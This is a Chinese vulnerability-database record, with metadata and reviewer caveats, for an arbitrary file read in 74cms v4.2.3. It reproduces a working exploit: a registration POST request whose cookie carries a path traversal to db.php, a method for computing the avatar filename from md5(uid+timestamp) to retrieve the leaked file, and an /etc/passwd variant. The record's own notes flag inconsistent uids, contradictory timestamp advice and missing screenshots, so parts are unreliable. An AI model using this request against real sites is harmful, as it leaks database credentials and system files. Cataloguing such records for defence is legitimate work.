---
source: "hatch 补库批 20260928"
product: "74cms"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "74cms v4.2.3 任意文件读取"
prerequisites: "来源所述条件，未列明部分仍待核：4.2.3; registration cookies; known uid/time-derived avatar path"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-54f5c7db067cf84c087e4a10"
entity_id: "ve-54f5c7db067cf84c087e4a10"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：4.2.3; registration cookies; known uid/time-derived avatar path

- **结论使用边界（1）**：All numbered illustrations replaced by bare 1.png–6.png text。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **结论使用边界（2）**：Request uid=123456 contradicts walkthrough uid=654321。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **结论使用边界（3）**：'Only record minutes/seconds' timestamp advice conflicts with full Unix time needed for filename generation。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **证据待核（4）**：No precise original source。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# 74cms v4.2.3任意文件读取

一、漏洞简介
------------

二、漏洞影响
------------

74cms v4.2.3

三、复现过程
------------

先尝试读取 db.php，向服务器post如下数据

    POST /index.php?m=&c=members&a=register HTTP/1.1
    Host: www.0-sec.org
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36 
    Accept-Encoding: gzip, deflate
    Accept: */*
    Connection: keep-alive
    Cookie: members_bind_info[temp_avatar]=../../../../Application/Common/Conf/db.php; members_bind_info[type]=qq; members_uc_info[password]=xcxmiku; members_uc_info[uid]=123456; members_uc_info[username]=xcxmiku
    Content-Type: application/x-www-form-urlencoded

    ajax=1&reg_type=2&utype=2&org=bind&ucenter=bind

会返回如下数据

1.png

在/data/upload/avatar/年月/日文件夹下 会生成一张图片

2.png

这张图片的名称由id和时间戳的md5值构成，我们可以将Burp
Suite上返回的时间转换为时间戳

3.png

不过这个时间可能会有误差，如果不行就把时间+-10

我post的id为654321，获取的时间戳为1571659588，将他们连在一起进行md5加密

4.png

成功获取图片名，然后访问

    https://www.0-sec.org/data/upload/avatar/1910/21/9aaa3653bf6ec9491bc002b52521962c.jpg 

保存该图片用文本打开就是 db.php 的内容。

###### PS:

使用post提交，参数如下

5.png

在Header可获取到时间戳

6.png

### 可能会遇到的问题

###### post数据返回unicode编码

因为名称，密码，ID等内容格式不对或重复会出现这种情况，将unicode编码进行解码，按提示修改即可。

###### 读取其他文件

../../../../Application/Common/Conf/db.php

是读取db.php，如果想读取根目录可以构造

../../../../../../../../etc/passwd

###### 时间戳问题

服务器返回的时间，服务器返回的是GMT格林威治标准时间，没有加上时区，只记录分秒即可
